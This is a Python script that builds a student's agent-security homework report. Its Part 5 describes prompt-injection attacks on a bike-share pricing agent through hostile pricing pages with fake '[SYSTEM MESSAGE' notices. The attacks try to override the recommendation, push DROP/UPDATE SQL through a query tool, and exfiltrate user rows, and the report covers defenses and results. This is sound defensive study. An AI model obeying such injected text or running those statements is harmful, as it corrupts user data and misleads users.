#!/usr/bin/env python3
"""
HW7 - build reports/hw07/Priyadarshini_HW7.docx in the same layout as the HW6 report:
letter page, 14 pt bold part headings, 12 pt bold subheadings, 11 pt body, 8 pt Courier code on a
grey band, plain grid tables, and red bracketed screenshot placeholders to paste into.

Code blocks are extracted from the real source files and every table is computed from
reports/hw07/raw/, so nothing in the report is retyped. The two things only the student can
supply are left as red placeholders: the tagged commit hash and the AI_USE.md answers.

    .venv/bin/python code/hw07/build_report.py
"""

from __future__ import annotations

import json
import re
import subprocess
import sys
from pathlib import Path

from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Inches, Pt, RGBColor

sys.path.insert(0, str(Path(__file__).resolve().parent))
import _extract as E  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parent / "bike"))
import tools as bike_tools  # noqa: E402

REPO = Path(__file__).resolve().parents[2]
RAW = REPO / "reports" / "hw07" / "raw"
OUT = REPO / "reports" / "hw07" / "Priyadarshini_HW7.docx"
RED = RGBColor(0xB4, 0x23, 0x18)


def J(name):
    p = RAW / name
    return json.loads(p.read_text()) if p.exists() else None


def T(name):
    return (RAW / name).read_text()


# --- document helpers (match the HW6 report's formatting) ----------------------------

doc = Document()
sec = doc.sections[0]
sec.page_width, sec.page_height = Inches(8.5), Inches(11)
for side in ("left_margin", "right_margin", "top_margin", "bottom_margin"):
    setattr(sec, side, Inches(0.8333))
doc.styles["Normal"].font.size = Pt(11)


def para(text="", size=11, bold=False, color=None, align=None, before=None, after=None, italic=False):
    p = doc.add_paragraph()
    if text:
        r = p.add_run(text)
        r.font.size, r.bold, r.italic = Pt(size), bold, italic
        if color is not None:
            r.font.color.rgb = color
    if align:
        p.alignment = align
    pf = p.paragraph_format
    if before is not None:
        pf.space_before = Pt(before)
    if after is not None:
        pf.space_after = Pt(after)
    return p


def h1(text):
    return para(text, 14, True, before=12, after=4)


def h2(text):
    return para(text, 12, True, before=8, after=3)


def body(text, **kw):
    return para(text, 11, **kw)


def rich(parts, after=4):
    """Body paragraph from [(text, bold)] pieces."""
    p = doc.add_paragraph()
    for text, bold in parts:
        r = p.add_run(text)
        r.font.size, r.bold = Pt(11), bold
    p.paragraph_format.space_after = Pt(after)
    return p


def bullet(text):
    p = body("•  " + text, after=2)
    p.paragraph_format.left_indent = Inches(0.2)
    return p


def shot(label):
    """A screenshot placeholder, styled like the earlier reports."""
    return para(f"[ Screenshot {label} ]", 11, True, RED, WD_ALIGN_PARAGRAPH.CENTER, before=4, after=6)


def fill_in(label):
    return para(f"[ {label} ]", 11, True, RED, WD_ALIGN_PARAGRAPH.CENTER, before=4, after=6)


def code(text, size=8):
    text = text.rstrip("\n")
    p = doc.add_paragraph()
    r = p.add_run(text)
    r.font.name, r.font.size = "Courier New", Pt(size)
    r._element.rPr.rFonts.set(qn("w:eastAsia"), "Courier New")
    r.bold = False
    p.paragraph_format.space_after = Pt(4)
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:fill"), "F2F4F7")
    p._p.get_or_add_pPr().append(shd)
    return p


def table(header, rows, size=10, widths=None):
    t = doc.add_table(rows=1, cols=len(header))
    t.style = "Table Grid"
    for i, h in enumerate(header):
        c = t.rows[0].cells[i]
        c.text = ""
        r = c.paragraphs[0].add_run(str(h))
        r.bold, r.font.size = True, Pt(size)
    for row in rows:
        cells = t.add_row().cells
        for i, v in enumerate(row):
            cells[i].text = ""
            r = cells[i].paragraphs[0].add_run(str(v))
            r.bold, r.font.size = False, Pt(size)
    if widths:
        for row in t.rows:
            for i, w in enumerate(widths):
                row.cells[i].width = Inches(w)
    para("", after=2)
    return t


def clip(s, n):
    s = " ".join(str(s).split())
    return s if len(s) <= n else s[: n - 1] + "…"


def git(*a):
    return subprocess.run(["git", *a], cwd=REPO, capture_output=True, text=True).stdout.strip()


# --- data -------------------------------------------------------------------------------

rel, att = J("reliability_summary.json"), J("reliability_attempts.json")
rel1, att1 = J("v1_initial/reliability_summary.json"), J("v1_initial/reliability_attempts.json")
cmp, cmp1 = J("reflexion_comparison_summary.json"), J("v1_initial/reflexion_comparison_summary.json")
runs1 = J("v1_initial/reflexion_comparison_runs.json")
refl1 = [json.loads(x) for x in (RAW / "v1_initial" / "reflections.jsonl").read_text().splitlines() if x.strip()]
bike = {n: J(f"bike_run_{n}.json")["result"] for n in ("membership_wins", "pay_per_use_wins")}
inj = {"Round 1 - structured Part 4 prompt": J("prompt_injection_results.json"),
       "Round 2 - naive minimal prompt": J("prompt_injection_results_naive.json"),
       "Round 3 - naive agent, stronger fixtures": J("prompt_injection_results_naive_strong.json")}
replay = J("tool_boundary_replay.json")
ver = J("../verification.json")
short = git("rev-parse", "--short", "HEAD")

# ============================================================================================
# Title block
# ============================================================================================
para("DATA 260 — Homework 7: JWT Authorization, Agent Loops, Reflexion, ReAct/MRKL, Prompt Injection "
     "and a Bash Safety Gate", 14, True)
body("Pragnaya Priyadarshini (Lucky) · SJSU MS Applied Data Intelligence")
para("GitHub repository: https://github.com/pragnayap/data260-3170", 11, True)
para("Collaborators: Sbnikitha and supriyaselvanganesan have access.", 11, True)

h1("Section 0 — Configuration")
table(["Value", "Definition", "Mine"], [
    ["SID4", "last 4 of SJSU student ID", "3170"],
    ["PORT_BASE", "8000 + (SID4 mod 900)", "8470"],
    ["PREFIX", "\"s\" + SID4", "s3170"],
    ["SEED", "SID4", "3170"],
    ["VERIFY_SEED", "260000 + SID4", "263170"],
    ["DOMAIN_ID", "SID4 mod 8", "2 — Municipal Transit Incidents"],
    ["Hardware", "", "Intel Core i9-9880H (x86_64), 16 GB RAM, macOS 15, CPU-only inference"],
    ["Local model", "", "qwen3:8b via Ollama (HW1 ModelClient / langchain-ollama)"],
    ["Tagged commit hash", "tag hw7", "[ fill in: git rev-parse --short hw7 ]"],
])
fill_in("After tagging, replace the commit-hash cell above. verification.json was generated against the commit "
        "just before the results commit; both are in the same branch.")

# ============================================================================================
# Part 1
# ============================================================================================
h1("Part 1 — JWT Authentication, Role-based Authorization and Linting")
body("The graded domain routes (/api/incidents and /api/routes) moved from the HW4 session cookie to JWT bearer "
     "authentication with roles reader, writer and moderator. The session code survives only at the hw4 tag; no "
     "HW7 route accepts both schemes. Passwords stay PBKDF2-HMAC-SHA256 (200,000 iterations, per-user salt) in "
     "MySQL.")

h2("1.I Authentication — POST /auth/login and GET /auth/me")
body("Files: code/web_application/jwt_auth.py (token, login, me, role dependency), session_crud.py "
     "(verify_username_login), seeded by code/seed_hw07.py. Login fetches the user from MySQL, verifies the hash, "
     "and only then signs the token (HS256, 60 min). The role is re-read from the database on every request, so a "
     "demotion takes effect immediately.")
code(E.get("code/web_application/jwt_auth.py", "create_access_token", "get_current_user", "require_roles",
           "login", "me"))
shot("1.1: successful login returning a JWT (Postman or terminal) and a failed login returning 401 Unauthorized")
shot("1.2: GET /auth/me without a token — 401 Unauthorized")
shot("1.3: GET /auth/me with an invalid or expired token — 401 Unauthorized (separate screenshot)")

h2("1.II Authorization — roles on the existing domain routes")
body("Existing routes only; no second generic /entities API. List and read: any authenticated role. Create and "
     "update: writer or moderator. Delete: moderator only. The same rules guard /api/routes.")
table(["Action", "reader", "writer", "moderator"], [
    ["List / read", "200", "200", "200"],
    ["Create (POST)", "403", "201", "201"],
    ["Delete", "403", "403", "204"],
    ["No token / bad token", "401", "401", "401"],
])
code(E.between("code/web_application/routers/incidents.py", "router = APIRouter(", "def _no_store")
     + "\n...\n" + E.between("code/web_application/routers/incidents.py", '@router.post(', "def create_incident",
                              include_end=True)
     + "\n...\n" + E.between("code/web_application/routers/incidents.py", '@router.delete(', "def delete_incident",
                              include_end=True))
shot("1.4: create request as reader → 403 Forbidden, and as writer or moderator → 201 Created")
shot("1.5: delete request as writer → 403 Forbidden, and as moderator → 204 No Content")
shot("1.6: list/read request with a valid token → 200 OK")

h2("1.III Database — MySQL users table")
body("id (primary key), username (unique), password_hash (salt$hash, never plaintext), role (reader, writer, "
     "moderator). HW4's name and email columns are kept so older rows stay valid; code/seed_hw07.py adds the two new "
     "columns with ALTER TABLE (create_all never alters an existing table) and seeds one user per role. "
     "verify_hw07.py checks that no stored hash contains the plaintext password.")
code(E.get("code/web_application/models.py", "User"))

h2("1.IV Linting — Ruff and pre-commit")
body("ruff.toml selects E, F, W, I and B; .pre-commit-config.yaml runs Ruff on every commit for the HW7 files. "
     "The transcripts below are the real runs: attempt 1 is blocked by the hook (I001 unsorted imports and F401 "
     "unused import, both planted), the two issues are fixed with ruff --fix, and attempt 2 commits.")
code((REPO / "ruff.toml").read_text() + "\n# .pre-commit-config.yaml\n" + (REPO / ".pre-commit-config.yaml").read_text())
code("$ git commit -m \"HW7 Part 1 ...\"   # attempt 1\n" + T("lint_demo_1_fail.txt").split("\n", 2)[2][:1400]
     + "\n...\n" + T("lint_demo_2_fixed.txt"))
shot("1.7: terminal — linting error before commit, the pre-commit hook running, the issues fixed, and the "
     "successful commit (your name visible)")
body("Disclosure: because the graded routes no longer accept the session cookie, the HW4 React frontend and the older "
     "verify scripts that call those routes with the cookie (verify_hw02–verify_hw05, measure_n1.py) are expected to "
     "get 401 at HEAD. I did not re-run them or port the React client; that code is unchanged at the hw2–hw5 tags.",
     italic=True)

# ============================================================================================
# Part 2
# ============================================================================================
h1("Part 2 — The Agent Loop")
body("run_agent(user_input) in code/hw07/agent.py uses the HW1 ModelClient and the three HW5 domain tools "
     "(search_incidents, incident_details, incident_stats) through execute_tool. Tool results are appended as "
     "tool-role messages. The loop stops at a final answer or the hard step ceiling (8). A reply is invalid when it is "
     "not a JSON tool call or answer (text_instead_of_tool), names an unknown tool (unknown_tool), or has malformed or "
     "schema-failing arguments (malformed_arguments). Each invalid reply is reprompted once with the specific problem; "
     "after two failed repairs the run stops cleanly as repair_exhausted. A tool saying \"no incident found\" is an "
     "observation, not an invalid call. Every tool invocation is logged with name and inputs, and the total is reported "
     "at the end.")
h2("2.I Implementation")
code(E.get("code/hw07/agent.py", "classify_tool_error", "check_reply"))
code(E.between("code/hw07/agent.py", "for step in range(1, max_steps + 1):", 'run.stop_reason = "max_steps"'))

h2("2.II Verification tasks (three multi-step tasks, no follow-up prompting)")
body("A: search a term, then look up the first result. B: answer an aggregate question, then find one supporting "
     "example. C: compare two entities with a search plus two detail lookups. Tool-invocation log excerpt "
     "(temperature 0; the full logs are in RUN_LOG.txt):")
demo = T("part2_demo_run.txt")
excerpt = []
for ln in demo.splitlines():
    if ln.startswith("=== Task") or "[tool call" in ln or "[answer]" in ln or "[done]" in ln or "[check]" in ln:
        excerpt.append(clip(ln, 150))
code("\n".join(excerpt))
shot("2.1: the agent completing task A (search → detail lookup of the first result), no follow-up prompt")
shot("2.2: the agent completing task B (aggregate → one supporting example)")
shot("2.3: the agent completing task C (search + two detail lookups, comparison answer)")

h2("2.III Error recovery — a nonexistent ID")
body("\"Show me the full details of incident INC-3170-99999\": execute_tool returns the useful message "
     "\"no incident found with code INC-3170-99999\", and the agent answers without crashing (the ID format is valid, so "
     "this is a real not-found, not a malformed call).")
shot("2.4: error-recovery case (nonexistent ID) handled without crashing")

h2("2.IV Reliability — 20 attempts (7 × A, 7 × B, 6 × C), temperature 0.7")
by_task = lambda a: {t: [x for x in a if x["task"] == t] for t in "ABC"}  # noqa: E731
rows = []
for label, s, a in (("Final run", rel, att), ("Initial run (before fixes)", rel1, att1)):
    bt = by_task(a)
    rows.append([label, s["well_formed_before_repair"], s["well_formed_after_repair"],
                 f"{sum(x['passed'] for x in bt['A'])}/{len(bt['A'])}", f"{sum(x['passed'] for x in bt['B'])}/{len(bt['B'])}",
                 f"{sum(x['passed'] for x in bt['C'])}/{len(bt['C'])}", s["task_pass"]])
table(["Run", "Well-formed before repair", "Well-formed after repair", "Task A", "Task B", "Task C", "Total"],
      rows, size=9)
table(["Failure class", "First-try failures (final run)", "Unrecovered (final run)"], [
    ["malformed arguments", sum("malformed_arguments" in x["problems"] for x in att),
     sum(x["failure_class"] == "malformed_arguments" for x in att)],
    ["unknown tool", sum("unknown_tool" in x["problems"] for x in att), sum(x["failure_class"] == "unknown_tool" for x in att)],
    ["text when a tool was required", sum("text_instead_of_tool" in x["problems"] for x in att),
     sum(x["failure_class"] == "text_instead_of_tool" for x in att)],
    ["lost multi-step chain", "—", sum(x["failure_class"] == "lost_chain" for x in att)],
])
body("Raw per-attempt data: reports/hw07/raw/reliability_attempts.csv and .json. The 7 first-try failures were all "
     "the same malformed call (search_incidents without its required query), and one reprompt fixed each.")
body("What changed between runs. The initial run passed 10/20: task B 0/7 (the model misread the stats list and named "
     "Safety Hazard, 1,269, although Delay, 1,286, was listed first) and task C 3/6, where the 3 failures were verifier "
     "false rejections (correct answer, literal incident code missing). Two fixes: one sentence added to the prompt "
     "(the stats list is sorted most-to-fewest), and a verifier that accepts the winner's code, route or rider count. A "
     "longer set of tool notes I tried first made task C regress at temperature 0, so it was cut back (trials in "
     "raw/dev_history/). Variants were tuned on the temperature-0 demo; the 20 attempts are fresh samples.")
sigs = {t: len({(x["tokens"], x["tool_calls"], tuple(x["problems"])) for x in att if x["task"] == t}) for t in "ABC"}
body(f"Limits of this measurement. Ollama does sample, but on these short tool-call tasks qwen3:8b is nearly "
     f"deterministic: the attempts collapse to {sigs['A']} (A), {sigs['B']} (B) and {sigs['C']} (C) distinct paths. The "
     "20 attempts are therefore not 20 independent samples, and the before-repair rate describes one repeated mistake "
     "rather than a random per-call error rate.", italic=True)

# ============================================================================================
# Part 3
# ============================================================================================
h1("Part 3 — Reflexion and Bounded Self-Correction")
body("code/hw07/reflexion.py wraps the Part 2 agent. After each run a deterministic verifier (below) checks the "
     "result; on failure the model writes one short reflection (at most two sentences, 400 characters) and the task is "
     "retried with the reflection in context. Bounds: at most 2 retries, a hard budget of 12 tool calls and 15,000 "
     "tokens per task, and a clean stop reason of success, budget_exhausted or human_review. Reflections are "
     "untrusted data: stored per (user, run_id), sent only as a labelled user-role note (never in the system prompt), "
     "and unable to change tool permissions or the safety gate, which live in code. test_reflection_isolation() "
     "asserts exactly that with a hostile reflection.")
h2("3.I Implementation and the verifier used per task")
code(E.get("code/hw07/reflexion.py", "write_reflection", "run_reflexion"))
code(E.get("code/hw07/tasks.py", "check_A", "check_B", "check_C", "check_missing"))

h2("3.II Stored reflection with its evidence (initial run, task B)")
r0 = refl1[0]
ev = r0["evidence"]
code(json.dumps({
    "user": r0["user"], "run_id": r0["run_id"], "task": r0["task"], "attempt": r0["attempt"],
    "failure": r0["failure"],
    "evidence": {"tool_calls": [{"tool": c["tool"], "inputs": c["inputs"], "ok": c["ok"],
                                 "observation": clip(c["observation"], 110)} for c in ev["tool_calls"]],
                 "answer": ev["answer"], "verifier_result": ev["verifier_result"]},
    "reflection": r0["reflection"]}, indent=1))
body(f"{len(refl1)} reflections were stored in the initial run (raw/v1_initial/reflections.jsonl); task B needed 1–2 "
     "retries in each of its four runs. The second reflection in a two-retry run, for example: "
     + clip(next(r for r in refl1 if r["attempt"] == 1)["reflection"], 260))
shot("3.1 (optional): terminal — a Reflexion run showing the reflection and the retry succeeding")

h2("3.III Original loop vs Reflexion loop (12 paired runs: 4 each of A, B, C; temperature 0.7)")


def cmp_rows(c):
    o, f = c["original"], c["reflexion"]
    return [["Task success", o["task_success"], f["task_success"]],
            ["Unsupported claims", o["unsupported_claims"], f["unsupported_claims"]],
            ["Retry rate (retries per run)", o["retry_rate"], f["retry_rate"]],
            ["Tool calls", o["tool_calls"], f["tool_calls"]],
            ["Tokens", f"{o['tokens']:,}", f"{f['tokens']:,}"],
            ["Latency (ms)", f"{o['latency_ms']:,}", f"{f['latency_ms']:,}"],
            ["Verifier false rejections", o["verifier_false_rejections"], f["verifier_false_rejections"]]]


body("Initial run — the base loop still had failures for Reflexion to correct:", after=2)
table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp1))
body("Final run — after the prompt and verifier fixes the original loop already passes every run, so Reflexion never "
     "triggers (0 retries) and the two columns are identical:", after=2)
table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp))
body("Attempt 0 of each run is the original loop and the final outcome is the Reflexion loop (a paired design). In "
     f"the initial run Reflexion cost {cmp1['reflexion']['tool_calls'] / cmp1['original']['tool_calls']:.1f}× the tool "
     f"calls and {cmp1['reflexion']['tokens'] / cmp1['original']['tokens']:.1f}× the tokens for 4 more successes; "
     "all 6 retries were task B. Caveats: the verifier's failure text names the correct category and goes into the "
     "reflection, so Reflexion is partly being told the answer; and with a near-deterministic model the 12 runs are a "
     "few paths repeated, so the counts are a demonstration, not a statistical estimate.")
h2("3.IV Verifier false rejections")
body("In the first reliability run the task-C check rejected attempts 16, 17 and 20 although the answers were correct, "
     "for example: \"The incident on Line 80 affected more riders, with 147 riders impacted compared to 0 riders … "
     "Line 200.\" Line 80 / 147 riders is exactly INC-3170-00022, but the verifier required the literal incident code. "
     "Counting those as correct, that run's pass rate would have been 13/20. I loosened the check to accept the "
     "winner's code, route or rider count, confirmed it accepts that answer and still rejects a wrong one, and re-ran. "
     "An independent, looser correctness oracle found 0 false rejections in both 12-run comparisons.")

# ============================================================================================
# Part 4
# ============================================================================================
h1("Part 4 — Framework ReAct/MRKL Public-Data Exercise (Capital Bikeshare)")
body("City: Capital Bikeshare (Washington, DC). The agent is a LangGraph create_react_agent over ChatOllama (qwen3:8b) "
     "and the three MRKL tools below; it recommends membership or pay-per-use from an uploaded trip CSV and the "
     "official pricing page. The page lists no monthly price, only $120/year, so monthly = $120 / 12 = $10 (an "
     "assumption, stated in every output). The LLM writes the decision and justification; code/hw07/bike/costs.py "
     "recomputes every figure independently, and the results panel shows the agent's numbers beside the verified ones.")
h2("4.I Tools (pure functions, common {success, data, error, source, ts} shape)")
code(E.get("code/hw07/bike/tools.py", "sql_is_single_select", "csv_sql"))
code(E.get("code/hw07/bike/tools.py", "policy_retriever"))
code(E.get("code/hw07/bike/tools.py", "_eval", "calculator"))
code(json.dumps({k: {"input": v["input_schema"], "output": v["output_schema"]} for k, v in bike_tools.SCHEMAS.items()},
                indent=1))
body("policy_retriever only fetches the official host or local fixture files (so a user-supplied URL cannot reach "
     "internal addresses); csv_sql runs on an in-memory SQLite table and, with the Part 5 contract on, accepts exactly "
     "one SELECT.")

h2("4.II UI")
body("localhost:8470/hw7 (code/web_application/bike_ui.html + routers/bike.py): sign in with a JWT, choose a CSV, "
     "paste the pricing URL, press Run. The timeline panel shows each tool call and observation as it happens; the "
     "results panel shows the decision, a cost comparison (agent vs verified), break-even versus actual, the weekly "
     "table, citations (URL, capture time, SHA-256), assumptions, and a metrics strip (steps, total time, stop "
     "reason). The API is behind the JWT roles, since a run uses the model and fetches a page.")

h2("4.III Acceptance runs (both datasets have at least 500 real trips)")
ref = {n: r["reference"] for n, r in bike.items()}
ans = {n: r["answer"] for n, r in bike.items()}
cit = {n: r["citations"][0] for n, r in bike.items()}
table(["", "Membership wins", "Pay-per-use wins"], [
    ["Dataset", "heavy_rider.csv", "light_rider.csv"],
    ["Trips / span", f"{ref['membership_wins']['rides']} trips, 1 month (July 2023)",
     f"{ref['pay_per_use_wins']['rides']} trips, {ref['pay_per_use_wins']['months_spanned']} months (2011–2024)"],
    ["Average ride / e-bike share", f"{ref['membership_wins']['avg_minutes']} min / {ref['membership_wins']['ebike_share']:.0%}",
     f"{ref['pay_per_use_wins']['avg_minutes']} min / {ref['pay_per_use_wins']['ebike_share']:.0%}"],
    ["Decision", ans["membership_wins"]["decision"], ans["pay_per_use_wins"]["decision"]],
    ["Pay-per-use total", f"${ref['membership_wins']['pay_per_use_total']:,.2f}", f"${ref['pay_per_use_wins']['pay_per_use_total']:,.2f}"],
    ["Membership total (fee + residual)",
     f"${ref['membership_wins']['membership_total']:,.2f} (${ref['membership_wins']['membership_fee_total']:,.2f} + ${ref['membership_wins']['membership_residual']:,.2f})",
     f"${ref['pay_per_use_wins']['membership_total']:,.2f} (${ref['pay_per_use_wins']['membership_fee_total']:,.2f} + ${ref['pay_per_use_wins']['membership_residual']:,.2f})"],
    ["Rides / month: actual vs break-even", f"{ref['membership_wins']['actual_rides_per_month']} vs {ref['membership_wins']['break_even_rides_per_month']}",
     f"{ref['pay_per_use_wins']['actual_rides_per_month']} vs {ref['pay_per_use_wins']['break_even_rides_per_month']}"],
    ["Steps / total time / stop reason", f"{bike['membership_wins']['step_count']} / {bike['membership_wins']['total_time_s']} s / {bike['membership_wins']['stop_reason']}",
     f"{bike['pay_per_use_wins']['step_count']} / {bike['pay_per_use_wins']['total_time_s']} s / {bike['pay_per_use_wins']['stop_reason']}"],
    ["Agent vs verified (4 checks)", "all pass" if all(bike["membership_wins"]["agent_vs_reference"].values()) else "see JSON",
     "all pass" if all(bike["pay_per_use_wins"]["agent_vs_reference"].values()) else "see JSON"],
], size=9)
shot("4.1: UI, membership-wins scenario — tool-call timeline, cost comparison, decision, citations, and the metrics strip")
shot("4.2: UI, pay-per-use-wins scenario — tool-call timeline, cost comparison, decision, citations, and the metrics strip")
mw, pp = ref["membership_wins"], ref["pay_per_use_wins"]
rich([("Membership wins. ", True),
      (f"The {mw['rides']} rides total {mw['avg_minutes'] * mw['rides']:,.0f} minutes ({mw['avg_minutes']} min average, "
       f"{mw['ebike_share']:.0%} e-bike). Pay-per-use would cost ${mw['pay_per_use_total']:,.2f}. Membership costs one month "
       f"at $10.00 plus ${mw['membership_residual']:,.2f} of overage (classic minutes past the free 45 and e-bike minutes at "
       f"$0.15) = ${mw['membership_total']:,.2f}, so the agent chose Buy Monthly Membership. Break-even is about "
       f"{mw['break_even_rides_per_month']} rides a month against {mw['actual_rides_per_month']:.0f} actual. Stop reason: "
       f"{bike['membership_wins']['stop_reason']}, {bike['membership_wins']['step_count']} steps. In this run the model first "
       "wrote a decision that contradicted its own totals and the self-consistency repair step (step 8 in the timeline) "
       "corrected it.", False)])
rich([("Pay-per-use wins. ", True),
      (f"The {pp['rides']} rides span {pp['months_spanned']} months ({pp['actual_rides_per_month']} rides a month, "
       f"{pp['avg_minutes']} min average). Pay-per-use costs ${pp['pay_per_use_total']:,.2f}; membership costs "
       f"{pp['months_spanned']} × $10 = ${pp['membership_fee_total']:,.2f} plus ${pp['membership_residual']:,.2f} of overage = "
       f"${pp['membership_total']:,.2f}, so the agent chose Pay Per Ride/Minute. Break-even is {pp['break_even_rides_per_month']} "
       f"rides a month against {pp['actual_rides_per_month']} actual. Stop reason: {bike['pay_per_use_wins']['stop_reason']}, "
       f"{bike['pay_per_use_wins']['step_count']} steps.", False)])

h2("4.IV Saved pricing-page evidence")
snap = lambda n: json.loads((RAW / "pricing_snapshots" / f"{n}.json").read_text())  # noqa: E731
runid = {"membership_wins": "run_5b2a4f14", "pay_per_use_wins": "run_ba648200"}
table(["Scenario", "Source URL", "Access date/time (UTC)", "SHA-256 of the saved text", "Snapshot file"], [
    [n.replace("_", " "), cit[n]["url"], cit[n]["accessed_at"], cit[n]["sha256"],
     f"raw/pricing_snapshots/{runid[n]}.txt"] for n in ("membership_wins", "pay_per_use_wins")], size=8)
body("Both captures hash identically (the page text did not change between them). All five pricing rules the agent "
     "uses ($120/year, $0.15/min classic, $0.35/min e-bike, 45 minutes free then $0.05/min, $1 unlock) were checked "
     "against the frozen text. Each run reads the frozen snapshot, so later changes to the public page cannot change "
     "the evidence.")
h2("4.V Assumptions, caveats and how the agent got here")
for t in [
    "The public data has no rider id, so each \"rider\" is assembled by sampling real trips (seed 3170). The light dataset "
    "samples seven monthly or yearly files between 2011 and 2024 and applies today's prices to those historical trips; its "
    "membership cost assumes the rides are spread evenly over the 162-month span.",
    "Monthly membership = annual price / 12; the page's \"30-Day Membership\" is mentioned without a price.",
    "The 8B model cannot write the rate-dependent SQL or hold the multi-step arithmetic on its own, so the final prompt gives "
    "copy-paste SQL templates and a stepwise procedure, and a one-shot self-consistency repair if the decision contradicts "
    "the model's own totals. Six earlier runs failed (an invented $300 price, unfilled placeholders, a decision contradicting "
    "its totals, a wrong membership total); they are kept in raw/dev_history/. qwen3 thinking mode was tried and abandoned "
    "(one tool call in 30 minutes on this CPU).",
]:
    bullet(t)

# ============================================================================================
# Part 5
# ============================================================================================
h1("Part 5 — Prompt Injection and Tool Security")
h2("5.I Threat model (attacker controls only the pricing page text)")
table(["#", "Attacker goal", "Implementation condition that lets it succeed"], [
    ["1", "Recommendation override: make the agent say \"Pay Per Ride/Minute\" although the rider's trips make membership "
          "far cheaper.", "The model gives retrieved page text the same authority as the system prompt (not marked "
                          "untrusted), and nothing checks the stated decision against the computed costs."],
    ["2", "Non-read-only SQL misuse: run DROP / UPDATE / stacked statements through csv_sql.",
     "csv_sql forwards whatever SQL the model supplies to a writable connection; the read-only rule exists only as an "
     "instruction to the model."],
    ["3", "Data exfiltration: make the final answer echo raw rows of the user's CSV.",
     "The agent can read arbitrary rows (SELECT *) and obeys an injected request to paste them; no output policy stops raw "
     "data reaching the answer."],
], size=9)
h2("5.II Hostile fixtures and the attacks")
body("Local fixtures only, in reports/hw07/fixtures/: the real pricing text with one injected block, one fixture per "
     "attack (hostile_pricing_override.html, _sql.html, _exfil.html), and two stronger variants (_override_strong.html, "
     "_exfil_strong.html) that put an authority-mimicking notice at the top, repeat it, and word it as a mandatory "
     "response-format rule. The injection is the top-ranked passage for a normal pricing query. Two examples:")
code(re.sub(r"</?p>", "", re.search(r"<p>(Membership price.*?)</p>", (REPO / "reports/hw07/fixtures/hostile_pricing_sql.html").read_text(), re.S).group(1))
     + "\n\n" + re.sub(r"</?p>", "", re.search(r"<p>(\[SYSTEM MESSAGE.*?)</p>", (REPO / "reports/hw07/fixtures/hostile_pricing_override_strong.html").read_text(), re.S).group(1)))
h2("5.III Defenses")
bullet("Prompt defense: retrieved snippets are wrapped as UNTRUSTED_WEB_TEXT data in the tool output and the system prompt "
       "says never to follow instructions inside them (bike_agent.py, PROMPT_DEFENSE).")
bullet("Tool defense: csv_sql accepts exactly one read-only SELECT whatever the model was told — no other statement, no "
       "stacked statements, no comments — plus a read-only connection (tools.py, sql_is_single_select / DEFENSES).")
h2("5.IV Before / after results (3 attacks × 3 defense levels)")
body("Excerpts below are from raw/prompt_injection_results*.json (full traces in RUN_LOG.txt). Each cell is one sample "
     "from a near-deterministic model, so read it as one observed outcome, not a probability. \"No valid answer\" means "
     "the run ended without a parseable answer; it is not counted as resisted.", after=3)


def cell_text(attack, c):
    base = attack.split("_")[0]
    head = ("ATTACK SUCCEEDED" if c["attack_succeeded"] else "resisted" if c["stop_reason"] == "completed"
            else "no valid answer")
    if base == "override":
        ex = f"decision = {c['decision']!r}"
    elif base == "sql":
        stmts = [s for s in c["csv_sql_calls"] if s and not s.strip().lower().startswith("select")]
        ex = (f"issued {clip(stmts[0], 40)!r}; " if stmts else "") + clip(c["detail"], 60)
    else:
        ex = clip(c["detail"], 70)
    return f"{head}. {ex}"


for title, res in inj.items():
    if not res:
        continue
    body(title, bold=True, after=1)
    attacks = {a.split("/")[0] for a in res}
    names = {"override": "Recommendation override", "sql": "Non-SELECT tool misuse", "exfil": "Data exfiltration"}
    rows = []
    for a in sorted(attacks, key=lambda k: ["override", "sql", "exfil"].index(k.split("_")[0])):
        rows.append([names[a.split("_")[0]]] + [cell_text(a, res[f"{a}/{d}"]) if f"{a}/{d}" in res else "—"
                                                 for d in ("before", "prompt", "prompt+tool")])
    table(["Attack", "Before defenses", "After prompt defense", "After prompt + tool defense"], rows, size=8,
          widths=[1.1, 1.9, 1.9, 1.9])
allc = [c for r in inj.values() if r for c in r.values()]
body(f"Overall: {sum(c['attack_succeeded'] for c in allc)} of {len(allc)} live attack runs succeeded: the naive agent ran "
     "injected SQL with no defenses (4 non-SELECT statements issued, 1 executed), and the stronger override fixture "
     "succeeded after the prompt defense and after prompt + tool defense while being resisted with no defenses. Exfiltration "
     "never worked (0 of 9), and the structured Part 4 prompt resisted everything — probably because its numbered procedure "
     "leaves no opening, which Round 2 tests with a minimal prompt. The override result shows the prompt label does not "
     "reliably protect; with one sample per cell it does not show the label made things worse.")
body("Because the defended SQL runs never tried the injected SQL, the tool boundary was also replayed directly: the "
     "statements a fooled model would send, aimed at csv_sql with the contract off and then on (scripted, no model):", after=2)
rp_rows = []
for a, b in zip(replay["guard_off"], replay["guard_on"], strict=True):
    rp_rows.append([clip(a["sql"], 48), f"{a['tool_success']} / {a['data_changed']}", f"{b['tool_success']} / {b['data_changed']}"])
table(["Statement", "Guard off: ran / data changed", "Guard on: ran / data changed"], rp_rows, size=8)
body("With the contract off, 6 of 7 hostile statements changed the data; with it on all 7 were refused, no data changed, "
     "and the legitimate SELECT still ran.")
shot("5.1 (optional): terminal — an attack run or the tool-boundary replay (python code/hw07/bike/part5_attacks.py replay)")
h2("5.V Why tool-boundary enforcement differs from a prompt-only defense")
body("A prompt defense is a request to the model. It works only if the model complies, it can be undone by better-worded "
     "text, and nothing verifies the outcome — Round 3 is a live example, where the label did not stop the override. A "
     "tool-boundary check is code that runs on every call whatever the model was told or believes: a fooled, jailbroken or "
     "simply wrong model still cannot make csv_sql run anything but a single SELECT. It is deterministic, testable without a "
     "model, and fails closed. It only covers what the tool can see: it cannot stop a wrong recommendation or data "
     "paraphrased into the answer, which is why override and exfiltration need output checks (for example recomputing the "
     "cost and comparing it with the stated decision) and are not solved by the SELECT contract.")

# ============================================================================================
# Part 6
# ============================================================================================
h1("Part 6 — File Tools and a Safety Gate")
body("code/hw07/file_tools.py is pure Python and runs only inside a temporary sandbox directory: one _resolve() guard "
     "rejects any path that escapes it. read_file supports max_lines, edit_file returns a short unified diff, "
     "search_in_files accepts file_pattern.")
h2("6.I Six file tools")
